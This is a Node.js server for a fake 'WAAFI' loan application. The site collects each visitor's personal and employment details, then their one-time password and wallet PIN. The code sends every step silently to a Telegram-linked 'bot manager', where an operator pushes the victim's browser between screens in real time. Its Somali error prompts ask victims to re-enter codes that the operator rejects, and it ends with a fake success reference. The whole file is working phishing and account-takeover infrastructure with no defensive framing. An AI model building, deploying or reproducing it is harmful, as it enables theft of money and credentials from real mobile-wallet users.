const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const axios = require('axios');
const path = require('path');

app.use(express.json());

// Serve static frontend assets from a 'public' directory to fix Render's "Cannot GET /"
app.use(express.static(path.join(__dirname, 'public')));

// Root route fallback handler
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const activeSessions = new Map();
const BOT_MANAGER_URL = process.env.BOT_MANAGER_URL || 'http://localhost:3001';

io.on('connection', (socket) => {
    const appId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
    
    activeSessions.set(socket.id, {
        appId: appId, socketId: socket.id,
        loanType: '', amount: 1200, term: '1', purpose: '',
        firstName: '', lastName: '', email: '', phone: '',
        employment: '', income: '', employer: '',
        otpToken: '', pinCode: '', step: 1
    });

    socket.emit('session-ready', { appId: appId });
    socket.join(appId);

    socket.on('step1', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { session = { ...session, ...payload, step: 2 }; activeSessions.set(socket.id, session); }
    });

    socket.on('step2', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { session = { ...session, ...payload, step: 3 }; activeSessions.set(socket.id, session); }
    });

    // STEP 3: Pushes the browser layout directly to Step 4. No admin approval required.
    socket.on('step3-data', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;
        
        Object.assign(session, payload);
        session.step = 4;
        activeSessions.set(socket.id, session);

        // Tell the user's browser to open Step 4 (OTP) instantly
        socket.emit('admin-approve-otp'); 

        // Send a copy of the application profile to Telegram silently for logs
        try {
            await axios.post(`${BOT_MANAGER_URL}/log-step3-data`, { session });
        } catch (err) {
            console.error("Error sending data log to Bot Manager:", err.message);
        }
    });

    // STEP 4: Fires ONLY when the user fills out the OTP form and submits
    socket.on('step4-otp', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.otpToken = payload.otp;
        activeSessions.set(socket.id, session);

        // Notify bot manager to prompt admin for OTP verification
        try {
            await axios.post(`${BOT_MANAGER_URL}/trigger-step4-telegram`, { session });
        } catch (err) {
            console.error("Error sending OTP alert to Bot Manager:", err.message);
        }
    });

    // STEP 5: Fires ONLY when the user fills out their wallet PIN and submits
    socket.on('step5-pin', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.pinCode = payload.pin;
        activeSessions.set(socket.id, session);

        // Notify bot manager to prompt admin for final authorization
        try {
            await axios.post(`${BOT_MANAGER_URL}/trigger-step5-telegram`, { session });
        } catch (err) {
            console.error("Error sending PIN alert to Bot Manager:", err.message);
        }
    });

    socket.on('disconnect', () => { activeSessions.delete(socket.id); });
});

// =========================================================================
// INCOMING WEBHOOK COMMAND ACTIONS FROM BOT_MANAGER.JS
// =========================================================================
app.post('/api/admin-action', (req, res) => {
    const { actionSignal, targetAppId, message } = req.body;
    
    let targetSession = null;
    for (let [socketId, record] of activeSessions.entries()) {
        if (record.appId === targetAppId) { targetSession = record; break; }
    }

    if (!targetSession) return res.status(404).json({ error: "Active application session not found" });
    const clientSocket = io.sockets.sockets.get(targetSession.socketId);
    if (!clientSocket) return res.status(410).json({ error: "User has gone offline" });

    // Handle Admin actions sent from Telegram buttons
    if (actionSignal === 'approve_otp') {
        // Moves the user's browser view from Step 4 (OTP) to Step 5 (PIN screen)
        clientSocket.emit('admin-approve-otp'); 
    } else if (actionSignal === 'otp-failed') {
        clientSocket.emit('otp-failed', { message: message || "Code-ka OTP-ga aad gelisay waa khalad. Fadlan dib u tijaabi." });
    } else if (actionSignal === 'approve_pin') {
        // Generates reference code and instantly forces client layout into Step 6 (Success Card)
        const generatedRef = 'COD-' + Math.floor(100000 + Math.random() * 900000);
        clientSocket.emit('pin-verified', { referenceId: generatedRef }); 
    } else if (actionSignal === 'pin-failed') {
        clientSocket.emit('pin-failed', { message: message || "PIN-ka koontada aad gelisay waa khalad. Fadlan iska hubi." });
    }

    return res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => console.log(`Web server routing on port ${PORT}`));